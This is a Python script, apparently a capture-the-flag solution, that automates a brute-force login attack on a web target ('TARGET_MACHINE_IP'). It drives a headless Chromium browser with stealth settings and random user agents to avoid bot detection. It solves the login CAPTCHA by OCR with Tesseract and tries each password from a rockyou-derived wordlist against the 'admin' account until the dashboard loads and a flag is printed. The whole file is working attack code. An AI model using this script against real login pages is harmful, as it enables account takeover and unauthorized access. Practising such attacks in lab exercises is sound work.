from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
from fake_useragent import UserAgent
from PIL import Image
import pytesseract
import os

# Ensure Tesseract path is set
pytesseract.pytesseract.tesseract_cmd = r"/usr/bin/tesseract"

# Create folder for saving CAPTCHA images
os.makedirs("captchas", exist_ok=True)

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/usr/bin/chromium"
service = Service(executable_path='/usr/bin/chromedriver')

chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://TARGET_MACHINE_IP'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'

username = "admin"

# Read passwords from file
with open("newrockyou.txt", "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

found = False
max_retries = 3

for password in passwords:
    retries = 0
    while retries < max_retries and not found:
        chrome.get(login_url)
        time.sleep(1)

        # Screenshot CAPTCHA
        captcha_elem = chrome.find_element(By.XPATH, "//img[@alt='CAPTCHA']")
        captcha_elem.screenshot("captcha.png")

        # OCR with tuned config
        img = Image.open("captcha.png")
        captcha_text = pytesseract.image_to_string(
            img,
            config="--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        ).strip().replace(" ", "").replace("\n", "").upper()

        # Fill form
        chrome.find_element(By.NAME, "username").send_keys(username)
        chrome.find_element(By.NAME, "password").send_keys(password)
        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)

        # Submit via button click
        try:
            chrome.find_element(By.ID, "login-btn").click()
        except:
            chrome.find_element(By.TAG_NAME, "form").submit()

        time.sleep(1)

        # Check result
        if dashboard_url in chrome.current_url:
            print(f"Password: {password} | Captcha: {captcha_text} | Status: SUCCESS")
            found = True
            try:
                flag = chrome.find_element(By.TAG_NAME, "p").text
                print(f"[+] {flag}")
            except:
                print("[!] Logged in, but no flag found.")
            break
        elif "Login failed." in chrome.page_source:
            print(f"Password: {password} | Captcha: {captcha_text} | Status: FAILED")
            break  # move to next password
        else:
            print(f"Password: {password} | Captcha: {captcha_text} | Status: MISREAD")
            retries += 1

os.remove("captcha.png")
chrome.quit()
